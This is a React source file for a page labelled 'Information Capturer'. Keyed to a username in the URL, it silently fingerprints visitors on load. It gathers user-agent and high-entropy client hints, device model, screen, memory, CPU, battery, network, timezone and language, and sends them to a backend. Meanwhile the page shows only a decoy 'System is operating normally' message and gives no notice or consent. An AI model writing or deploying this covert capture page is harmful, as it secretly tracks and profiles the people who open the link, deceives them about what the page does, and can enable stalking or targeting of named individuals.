import { useEffect, useRef } from "react";
import { useRecordVisit } from "@workspace/api-client-react";

// Parse UA string accurately (fallback when UA-CH is unavailable)
function parseUAString(ua: string): {
  browserName: string | null;
  browserVersion: string | null;
  osName: string | null;
  osVersion: string | null;
  deviceModel: string | null;
  isMobile: boolean;
  platform: string;
} {
  let browserName: string | null = null;
  let browserVersion: string | null = null;
  let osName: string | null = null;
  let osVersion: string | null = null;
  let deviceModel: string | null = null;
  let isMobile = false;

  // Mobile detection
  isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);

  // OS detection
  if (/Android/i.test(ua)) {
    osName = "Android";
    const m = ua.match(/Android\s([0-9.]+)/i);
    osVersion = m ? m[1] : null;
    // Device model from "Build/..." pattern or between ";" pairs
    const modelMatch = ua.match(/;\s*([^;)]+)\s+Build\//);
    deviceModel = modelMatch ? modelMatch[1].trim() : null;
  } else if (/iPhone|iPad|iPod/.test(ua)) {
    osName = /iPad/.test(ua) ? "iPadOS" : "iOS";
    const m = ua.match(/OS\s([0-9_]+)/i);
    osVersion = m ? m[1].replace(/_/g, ".") : null;
    deviceModel = /iPhone/.test(ua) ? "iPhone" : /iPad/.test(ua) ? "iPad" : "iPod";
  } else if (/Windows NT/i.test(ua)) {
    osName = "Windows";
    const ntMap: Record<string, string> = {
      "10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7", "6.0": "Vista", "5.1": "XP",
    };
    const m = ua.match(/Windows NT\s([0-9.]+)/i);
    osVersion = m ? (ntMap[m[1]] || m[1]) : null;
  } else if (/Mac OS X/i.test(ua)) {
    osName = "macOS";
    const m = ua.match(/Mac OS X\s([0-9_.]+)/i);
    osVersion = m ? m[1].replace(/_/g, ".") : null;
  } else if (/Linux/i.test(ua)) {
    osName = "Linux";
    const archMatch = ua.match(/Linux\s+(aarch64|armv[0-9]+[a-z]*|x86_64|i686)/i);
    osVersion = archMatch ? archMatch[1] : null;
  } else if (/CrOS/i.test(ua)) {
    osName = "ChromeOS";
  }

  // Browser detection — order matters (Edge before Chrome, etc.)
  if (/Edg\/([0-9.]+)/i.test(ua)) {
    browserName = "Edge";
    browserVersion = ua.match(/Edg\/([0-9.]+)/i)?.[1] ?? null;
  } else if (/OPR\/([0-9.]+)|Opera\/([0-9.]+)/i.test(ua)) {
    browserName = "Opera";
    browserVersion = ua.match(/OPR\/([0-9.]+)/i)?.[1] ?? ua.match(/Opera\/([0-9.]+)/i)?.[1] ?? null;
  } else if (/SamsungBrowser\/([0-9.]+)/i.test(ua)) {
    browserName = "Samsung Browser";
    browserVersion = ua.match(/SamsungBrowser\/([0-9.]+)/i)?.[1] ?? null;
  } else if (/Firefox\/([0-9.]+)/i.test(ua)) {
    browserName = "Firefox";
    browserVersion = ua.match(/Firefox\/([0-9.]+)/i)?.[1] ?? null;
  } else if (/Chrome\/([0-9.]+)/i.test(ua)) {
    // Check for WebView
    if (/wv\)/i.test(ua) || /; wv\)/i.test(ua)) {
      browserName = "Chrome WebView";
    } else {
      browserName = "Chrome";
    }
    browserVersion = ua.match(/Chrome\/([0-9.]+)/i)?.[1] ?? null;
  } else if (/Safari\/([0-9.]+)/i.test(ua) && /Version\/([0-9.]+)/i.test(ua)) {
    browserName = "Safari";
    browserVersion = ua.match(/Version\/([0-9.]+)/i)?.[1] ?? null;
  } else if (/MSIE\s([0-9.]+)|Trident.*rv:([0-9.]+)/i.test(ua)) {
    browserName = "Internet Explorer";
    browserVersion = ua.match(/MSIE\s([0-9.]+)/i)?.[1] ?? ua.match(/rv:([0-9.]+)/i)?.[1] ?? null;
  }

  // Build platform string
  const parts: string[] = [];
  if (osName) parts.push(osName + (osVersion ? ` ${osVersion}` : ""));
  if (deviceModel) parts.push(deviceModel);
  const platform = parts.join(" · ") || navigator.platform || "Unknown";

  return { browserName, browserVersion, osName, osVersion, deviceModel, isMobile, platform };
}

export default function VisitorPage() {
  const searchParams = new URLSearchParams(window.location.search);
  const username = searchParams.get("username");
  const { mutate } = useRecordVisit();
  const captured = useRef(false);

  useEffect(() => {
    if (!username || captured.current) return;
    captured.current = true;

    const capture = async () => {
      const rawUA = navigator.userAgent;

      // --- Parse UA string as baseline ---
      const parsed = parseUAString(rawUA);

      let browserName = parsed.browserName;
      let browserVersion = parsed.browserVersion;
      let osName = parsed.osName;
      let osVersion = parsed.osVersion;
      let deviceModel = parsed.deviceModel;
      let isMobile = parsed.isMobile;
      let architecture: string | null = null;
      let platform = parsed.platform;

      // --- Use UA-CH (User Agent Client Hints) if available — much more accurate ---
      const uaData = (navigator as any).userAgentData;
      if (uaData) {
        try {
          const high = await uaData.getHighEntropyValues([
            "platform",
            "platformVersion",
            "architecture",
            "model",
            "uaFullVersion",
            "fullVersionList",
            "mobile",
          ]);

          // fullVersionList gives the most accurate browser name + version
          if (high.fullVersionList && high.fullVersionList.length > 0) {
            // Pick the most specific non-"Not" brand
            const real = (high.fullVersionList as { brand: string; version: string }[])
              .filter((b) => !b.brand.includes("Not") && b.brand !== "Chromium")
              .sort((a, b) => b.brand.length - a.brand.length)[0];
            if (real) {
              browserName = real.brand;
              browserVersion = real.version;
            } else {
              // Fallback to Chromium version
              const chromium = high.fullVersionList.find((b: any) => b.brand === "Chromium");
              if (chromium) {
                browserName = "Chromium";
                browserVersion = chromium.version;
              }
            }
          }

          // Accurate OS platform and version from UA-CH
          if (high.platform) osName = high.platform;
          if (high.platformVersion) osVersion = high.platformVersion;
          if (high.architecture) architecture = high.architecture;
          if (high.model) deviceModel = high.model || null;
          if (typeof high.mobile === "boolean") isMobile = high.mobile;

          // Rebuild platform string from UA-CH data
          const caParts: string[] = [];
          if (osName) caParts.push(osName + (osVersion ? ` ${osVersion}` : ""));
          if (architecture) caParts.push(architecture);
          if (deviceModel) caParts.push(deviceModel);
          if (caParts.length > 0) platform = caParts.join(" · ");
        } catch {
          // UA-CH getHighEntropyValues failed — keep parsed fallback
        }
      }

      const data: Record<string, unknown> = {
        username,
        ua: rawUA,
        platform,
        browserName,
        browserVersion,
        osName,
        osVersion,
        deviceModel: deviceModel || null,
        isMobile,
        architecture: architecture || null,
        deviceTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        screenDpr: window.devicePixelRatio,
        memoryGb: (navigator as any).deviceMemory ?? null,
        cpuCores: navigator.hardwareConcurrency ?? null,
        touchPoints: navigator.maxTouchPoints ?? null,
        lang: navigator.language,
      };

      // Battery API
      if ((navigator as any).getBattery) {
        try {
          const battery = await (navigator as any).getBattery();
          data.batteryLevel = battery.level;
          data.batteryCharging = battery.charging;
        } catch {
          // not available
        }
      }

      // Network Information API
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn) {
        data.networkType = conn.effectiveType || conn.type || null;
        data.networkDownlink = conn.downlink ?? null;
        data.networkRtt = conn.rtt ?? null;
      }

      mutate({ data: data as any });
    };

    capture();
  }, [username, mutate]);

  return (
    <div className="min-h-[100dvh] w-full flex flex-col items-center justify-center bg-white text-gray-800 font-sans p-6">
      <div className="text-center max-w-md w-full">
        <div className="w-12 h-12 bg-gray-100 rounded-xl mx-auto mb-6 flex items-center justify-center">
          <svg
            className="w-6 h-6 text-gray-400"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h1 className="text-2xl font-semibold tracking-tight text-gray-900 mb-2">
          Information Capturer
        </h1>
        <p className="text-gray-500 text-sm leading-relaxed">
          System is operating normally. All services are currently active and available.
        </p>
      </div>
    </div>
  );
}
